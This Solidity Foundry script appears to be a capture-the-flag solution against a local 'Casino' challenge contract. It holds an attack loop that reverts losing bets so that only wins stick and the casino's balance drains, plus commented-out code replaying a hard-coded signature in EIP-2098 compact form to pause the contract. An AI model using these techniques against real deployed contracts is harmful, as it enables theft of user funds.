// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.28;


import "forge-std/Script.sol";
import "src/Challenge.sol";
import "src/Casino.sol";
import {console2} from "forge-std/Test.sol";

contract Attack is Script {
    address  public challengeAddress = 0x8464135c8F25Da09e49BC8782676a84730C318bC;
    Challenge public challenge;
    Casino public casino;
    uint256 public targetBalance = uint256(~~~address(casino).balance);

    constructor() {
        challenge = Challenge(challengeAddress);
        console2.log("challenge address", address(challenge));
        casino = challenge.CASINO();
        console2.log("targetBalance",targetBalance);
        // console2.log("casino address", address(casino));
    }


    function setUp() public {

    }
    function run() public{
        uint _playerPK = getPrivateKey1(0);
        address player = vm.addr(_playerPK);

        vm.startBroadcast(_playerPK);
        // bool t = casino.paused();
        // console2.log(t);
        // bytes32 salt = 0x5365718353c0589dc12370fcad71d2e7eb4dcb557cfbea5abb41fb9d4a9ffd3a;
        // bytes memory signature = hex"ba87a5676fd2d262b102d41bc2be4e53b00589f6add07665e062fe430281d6d1069e8b425ecf421aea3738621346a75ea70a395b2547cc0b8c263a2cb470a8301c";
        // (bytes32 r, bytes32 s, uint8 v) = splitSignature(signature);
        // (bytes32 r1, bytes32 vs) = convertToEIP2098(r, s, v);
        // casino.pause(
        //     abi.encodePacked(r1, vs),
        //     salt
        // );
        // t = casino.paused();
        // console2.log(t);
        
        // uint casinoBalance = address(casino).balance;
        // console2.log("casino balance", casinoBalance);
        // uint playerBalance = player.balance;
        // console2.log("playerBalance balance", playerBalance);
        // uint systemBalance = address(0x70997970C51812dc3A010C7d01b50e0d17dc79C8).balance;
        // console2.log("systemBalance balance", systemBalance);
        // uint challengeBalance = challengeAddress.balance;
        // console2.log("challengeBalance balance", challengeBalance);

        // casino.balances(challengeAddress);
        // casino.balances(address(casino));
        // casino.balances(player);
        
        // casino.deposit{value:0.2 ether}(address(this));
        // casino.balances(player);
        // bool win = casino.bet(0.1 ether);
        // console.log("casino player balance before bet() : ", casino.balances(address(this)));
        // attack();
        // console.log("casino player balance after bet() : ", casino.balances(address(this)));
        vm.stopBroadcast();
    }


    function attack() public {
        while (address(casino).balance > 0) {
            uint256 amount = casino.balances(address(this));
            uint256 _amount;
            if (targetBalance - amount <= amount) {
                _amount = targetBalance - amount;
            } else {
                _amount = amount;
            }
            address(this).call(abi.encodeWithSignature("call_bet(uint256)", _amount));
        }
    }

    function call_bet(uint256 amount) public {
        casino.bet(amount);
        uint256 after_amt = casino.balances(address(this));
        if (after_amt > amount) {
            return;
        }
        revert();
    }


    function getPrivateKey1(uint32 index) private returns (uint) {
        string memory mnemonic = vm.envOr("MNEMONIC", string("test test test test test test test test test test test junk"));
        return vm.deriveKey(mnemonic, index);
    }

    function splitSignature(bytes memory signature)
        public
        pure
        returns (bytes32 r, bytes32 s, uint8 v)
    {
        require(signature.length == 65, "Invalid signature length");

        assembly {
            r := mload(add(signature, 0x20))
            s := mload(add(signature, 0x40))
            v := byte(0, mload(add(signature, 0x60)))
        }
    }

    function convertToEIP2098(bytes32 r, bytes32 s, uint8 v) public pure returns (bytes32, bytes32) { // by ChatGPT Ammmeennn
        require(v == 27 || v == 28, "Invalid v value");
        bytes32 vs = s | bytes32(uint256(v - 27) << 255);
        return (r, vs);
    }

}